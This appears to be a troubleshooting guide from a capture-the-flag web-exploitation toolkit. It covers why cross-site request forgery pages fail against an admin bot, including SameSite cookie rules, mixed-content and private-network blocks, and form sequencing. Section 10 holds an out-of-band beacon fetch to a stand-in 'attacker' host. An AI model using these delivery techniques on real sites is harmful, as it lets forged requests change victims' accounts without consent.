# Delivery troubleshooting — the firing-side failures

The write's mechanics all checked out, but the page won't fire or
the bot won't run it. The delivery-side failure corpus.

---

## 1. The page didn't load

```text
- the URL didn't reach the bot → the submit endpoint's response?
  a 400/422 on submit = a URL-validation failure; a timeout = a
  queue
- the bot can't reach your host → airgapped; use a data: URL
- the page returned an error → a 404/500 on your host
- a CSP on YOUR host blocks the inline script → the form's submit
  never runs
```

## 2. The page loaded but didn't fire

```text
- a JS error before the submit → put submit() FIRST
- the form.submit() name collides → use document.forms[0].submit()
  or getElementById
- a popup-blocker killed window.open → use location= or a form
- the async fetch got cut off → the bot closed before it fired —
  a form nav commits, a fetch may not
```

## 3. The write fired but didn't reach the endpoint

```text
- a mixed-content block (https page → http target) → use http/data:
- a PNA block (fetch to loopback) → use a form nav
- a wrong path/method → 404/405 on the write
- a redirect that lost the body → a 302-after-POST becomes a GET
- a CSP on the TARGET blocked the form → rare, but form-action CSP
```

## 4. The write reached but got rejected

```text
- 403 + a CSRF-token error → the token gate held
- 403 on the foreign-Origin → the header gate held
- 415 Unsupported Media → the content-type gate held
- 400 Bad Request → the body didn't parse — the = broke the JSON,
  or a required field missing
- a 200 but inert → the bind dropped the field or the validator
  rejected the value
```

## 5. The cookie didn't attach

```text
- SameSite=Lax on a POST → blocked; needs a GET-write top-nav or a
  None cookie
- SameSite=Strict → blocked on everything cross-site
- a Partitioned cookie → third-party attach dead
- the wrong cookie-path → the write's path isn't under Path=
- a Secure cookie on an http request → not sent over http
```

## 6. The bot-specific failures

```text
- the bot visited but nothing changed → the write didn't reach OR
  the cookie didn't attach
- the bot closed too fast → a synchronous form.submit() beats async
- the bot doesn't run JS → a pure-HTML form + a click (rare)
- the bot blocks external requests → the write must target an
  internal host or a data: page
- the bot whitelists domains → a stored page or a data: URL
- the bot's browser is old → missing-SameSite may still attach (a
  favorable old-build)
```

## 7. The sequencing failures — a multi-step that won't order

```text
- the second form fires before the first lands → use iframe onload
  to sequence, or a fetch chain
- a race that needs more overlap → more iframes, tighter timing
- a deferred write that needs a future trigger → the stored shape
```

## 8. The response-side surprises — what the server answered

```text
- the endpoint 302s to login → the credential didn't attach
- the endpoint 302s to a same-page → the write processed but the
  readback is elsewhere
- the endpoint returns HTML not JSON → the write's bind is form-
  based not JSON — adjust the carrier
- a CSRF-error page → the token gate held
```

## 9. The "it worked locally but not on the bot" delta

```text
- YOUR browser attaches the cookie; the bot's doesn't (a different
  SameSite/build)
- YOUR page's http→http works; the bot's https-page→http-target
  gets mixed-content blocked
- YOUR fetch to loopback works (no PNA on your browser); the bot's
  modern chrome PNA-blocks it → form nav
- YOUR jar is fresh; the bot's shared jar differs
```

## 10. The diagnostic sequence — naming the failure

```bash
# 1. did the bot even visit? → an OOB beacon on the page
fetch('https://attacker/hit?loaded=1',{mode:'no-cors'})
python3 tools/web/oob_listener.py hits

# 2. did the write reach? → a state marker on a known-accepted field
#    or a second OOB beacon AFTER the form submit

# 3. did the write land? → the readback oracle
curl -s -b "$CJ" "$BASE/api/me" | grep -o 'marker'

# 4. which gate held? → the response the endpoint returned (if you
#    can proxy/measure it) or the refutes verdict on the state
```

## 11. The falsifier-consolidation

```text
after every delivery shape fails and each gate is measured:
- name the gate that held (token/Origin/content-type/SameSite)
- name the class that bypasses it (XSS for a stored context, CORS
  for a read, SSRF for a server-fetch)
- record the refutes with evidence
- escalate: chain_match → reclassify → writeup_search → novel_plan
```

## 12. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "delivery-fail: <symptom> -> <the gate/carrier that failed>"
```
